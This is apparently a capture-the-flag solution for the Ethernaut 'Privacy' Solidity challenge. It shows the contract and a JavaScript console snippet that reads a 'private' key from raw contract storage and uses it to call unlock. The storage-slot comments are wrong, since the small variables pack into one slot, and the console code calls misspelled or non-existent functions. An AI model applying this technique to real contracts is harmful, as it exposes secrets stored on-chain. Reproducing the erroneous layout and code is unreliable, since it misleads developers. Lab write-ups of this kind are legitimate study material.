// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true; //slot 0
    uint256 public ID = block.timestamp; //slot 1
    uint8 private flattening = 10; //slot 2
    uint8 private denomination = 255; //slot 3
    uint16 private awkwardness = uint16(block.timestamp); //slot 4
    bytes32[3] private data; //slot 5,6,7

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}

// as we can see the private variable `data` can be accessed through Storage
// after getting the data we can see that it is in the bytes32 we need to typecast it to bytes16.
//I solved using console
```js
let key = await web3.eth.storageAt("targetAddresss", 5)
key = key.slice(0,34) // as byte16 is 32 + we need save 0x also = 34
await web3.unlock(key);
await web3.locaked() // check if it's false
```
